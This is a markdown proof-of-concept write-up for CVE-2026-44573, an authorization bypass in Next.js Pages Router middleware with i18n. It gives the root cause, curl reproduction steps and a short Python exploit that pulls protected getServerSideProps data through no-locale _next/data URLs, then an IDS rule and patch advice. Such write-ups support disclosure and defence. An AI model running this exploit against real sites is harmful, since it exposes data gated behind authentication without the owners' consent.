@@ -1,0 +1,196 @@
+# Next.js i18n Middleware Bypass (CVE-2026-44573)
+
+<!-- 
+  File: 2026-05-17_nextjs-i18n-middleware-bypass.md
+  Location: pocs/web/
+-->
+
+---
+
+## Metadata
+
+| Field | Value |
+|---|---|
+| **Date Added** | 2026-05-17 |
+| **Last Updated** | 2026-05-08 |
+| **Author / Researcher** | dwisiswant0 |
+| **CVE / Advisory** | CVE-2026-44573 |
+| **Category** | web |
+| **Severity** | High |
+| **CVSS Score** | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
+| **Status** | Weaponized |
+| **Tags** | middleware-bypass, i18n, _next/data, Pages-Router, authorization-bypass, information-disclosure, Next.js, unauthenticated |
+| **Related** | N/A |
+
+---
+
+## Affected Target
+
+| Field | Value |
+|---|---|
+| **Software / System** | Next.js Pages Router with i18n configuration |
+| **Versions Affected** | Next.js 12.2.0 - 15.5.15 and 16.0.0 - 16.2.4 |
+| **Language / Platform** | JavaScript / Node.js |
+| **Authentication Required** | No |
+| **Network Access Required** | Yes |
+
+---
+
+## Summary
+
+CVE-2026-44573 is an authorization bypass in Next.js Pages Router applications that use the `i18n` configuration. The middleware matcher regex's i18n branch does not correctly cover all locale-prefix permutations of `_next/data/<buildId>/<page>.json` URLs. As a result, requesting the no-locale or wrong-locale variant of a data URL bypasses middleware entirely, allowing unauthenticated retrieval of `getServerSideProps` JSON payloads for pages that middleware was supposed to protect. The buildId required for the attack is trivially discoverable from any public HTML response. Rated CVSS 7.5 High with no known active exploitation.
+
+---
+
+## Vulnerability Details
+
+### Root Cause
+
+`getMiddlewareMatchers` in Next.js compiled a middleware matcher regex that recognised `(_next/data/[^/]{1,})?` as a prefix but its i18n handling branch only processed the locale-prefixed data URL shape (`/<buildId>/<locale>/<page>.json`). The no-locale form (`/<buildId>/<page>.json`) and the form with a non-default locale did not re-trigger the middleware match. Additionally, `x-nextjs-data` was trusted as an inbound header, allowing the inner server to be told the request was a data request regardless of the resolved pathname. The patch cluster (`6fd09bf8ab` and adjacent commits) widened the matcher to cover all locale-prefixed data variants, moved `setIsNextDataRequest()` to trigger on the resolved pathname, and added `x-nextjs-data` to the `INTERNAL_HEADERS` strip list.
+
+### Attack Vector
+
+Attacker discovers the `buildId` from any public HTML response (`__NEXT_DATA__.buildId`) and sends a `GET /_next/data/<buildId>/<protectedPage>.json` request (no locale segment) with `x-nextjs-data: 1` header to a Next.js i18n Pages Router application. Middleware is not invoked, and the server renders and returns the `getServerSideProps` JSON payload for the protected page.
+
+### Impact
+
+Authorization bypass - Pages Router middleware that gates pages by pathname is fully circumvented for the JSON data variant. Unauthenticated information disclosure of `getServerSideProps` props (serialized to JSON). Potential cache poisoning once the bypass response is stored at CDN level.
+
+---
+
+## Environment / Lab Setup
+
+```
+OS:          Linux / macOS / Windows
+Target:      Next.js 12.2.0 - 15.5.15 or 16.0.0 - 16.2.4 with i18n config and middleware auth
+Attacker:    Any host able to send crafted HTTP GET requests
+Tools:       python3, bash, curl
+```
+
+### Setup Steps
+
+```bash
+# Clone source PoC collection
+git clone https://github.com/dwisiswant0/next-16.2.4-pocs.git
+cd next-16.2.4-pocs/poc/CVE-2026-44573_GHSA-36qx-fr4f-26g5
+
+# Run exploit (auto-discovers buildId from homepage)
+TARGET=http://localhost:3000 \
+PROTECTED_PATH=/secret \
+DEFAULT_LOCALE=en \
+python3 exploit.py
+```
+
+---
+
+## Proof of Concept
+
+### Step-by-Step Reproduction
+
+1. **Discover buildId** from the public homepage HTML.
+   ```bash
+   curl -s http://target/ | grep -o '"buildId":"[^"]*"' | head -1
+   # Returns: "buildId":"abc123xyz"
+   ```
+
+2. **Confirm baseline is blocked** - canonical protected path returns redirect.
+   ```bash
+   curl -i http://target/secret
+   # Expect: HTTP/1.1 307  Location: /login
+   ```
+
+3. **Send bypass request** - no-locale data URL with x-nextjs-data header.
+   ```bash
+   curl -i -H 'x-nextjs-data: 1' \
+     "http://target/_next/data/abc123xyz/secret.json"
+   # Vulnerable: HTTP/1.1 200  Content-Type: application/json  (contains secret props)
+   # Patched:    HTTP/1.1 307  Location: /login
+   ```
+
+### Exploit Code
+
+> See `exploit.py` and `exploit.sh` in this folder.
+
+```python
+# Minimal inline PoC — full version in exploit.py
+import re, urllib.request, urllib.error
+
+TARGET = "http://target"
+
+# Step 1: discover buildId
+with urllib.request.urlopen(TARGET + "/") as r:
+    text = r.read().decode()
+build_id = re.search(r'"buildId"\s*:\s*"([^"]+)"', text).group(1)
+
+# Step 2: bypass
+req = urllib.request.Request(
+    f"{TARGET}/_next/data/{build_id}/secret.json",
+    headers={"x-nextjs-data": "1"}, method="GET"
+)
+class NoRedirect(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, *a, **kw): return None
+with urllib.request.build_opener(NoRedirect()).open(req) as r:
+    print(r.status, r.read(500))
+```
+
+### Expected Output
+
+```
+x VULNERABLE — variant A: data-route returned the protected JSON payload (sentinel 'SECRET_PROPS_FLAG' present).
+
+>>> RESULT: PASS (vulnerability reproduced) <<<
+```
+
+---
+
+## Screenshots / Evidence
+
+- `screenshots/` - add response captures showing unprotected JSON payload returned for middleware-gated path
+
+---
+
+## Detection & Indicators of Compromise
+
+```
+# HTTP access log pattern: GET to _next/data URL for a protected page without locale prefix
+GET /_next/data/<buildId>/<page>.json  x-nextjs-data: 1
+# Response: 200 OK application/json for a path that normally redirects
+```
+
+**SIEM / IDS Rule (example):**
+```
+alert http any any -> $HTTP_SERVERS any (
+  msg:"Possible CVE-2026-44573 i18n data-route middleware bypass";
+  content:"/_next/data/"; http_uri;
+  content:"x-nextjs-data|3a|"; http_header;
+  pcre:"/\/_next\/data\/[^\/]+\/[^\/]+\.json/U";
+  sid:900044573; rev:1;
+)
+```
+
+---
+
+## Remediation
+
+| Action | Detail |
+|---|---|
+| **Patch** | Upgrade Next.js to 15.5.16 or 16.2.5+ |
+| **Workaround** | Enforce auth inside `getServerSideProps` itself; never rely on middleware as the sole gate for sensitive pages |
+| **Config Hardening** | Strip `x-nextjs-data` and block `_next/data/<buildId>/...` requests at CDN/WAF for paths that require authentication |
+
+---
+
+## References
+
+- [CVE-2026-44573 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-44573)
+- [Next.js Advisory - GHSA-36qx-fr4f-26g5](https://github.com/vercel/next.js/security/advisories/GHSA-36qx-fr4f-26g5)
+- [Next.js Patch Commit 6fd09bf8ab](https://github.com/vercel/next.js/commit/6fd09bf8ab)
+- [Source Repository - dwisiswant0/next-16.2.4-pocs](https://github.com/dwisiswant0/next-16.2.4-pocs)
+
+---
+
+## Notes
+
+Auto-ingested from https://github.com/dwisiswant0/next-16.2.4-pocs on 2026-05-17.
+
+No known active exploitation at time of disclosure. The fix for this CVE shares patch infrastructure with CVE-2026-44572 (`x-nextjs-data` header stripping in `server-ipc/utils.ts`) and CVE-2026-44575 (matcher regex widening). Defenders should note that the buildId is not a secret - it is embedded in every HTML response - so treating it as an access control boundary provides no protection. Issue tracked as #52.
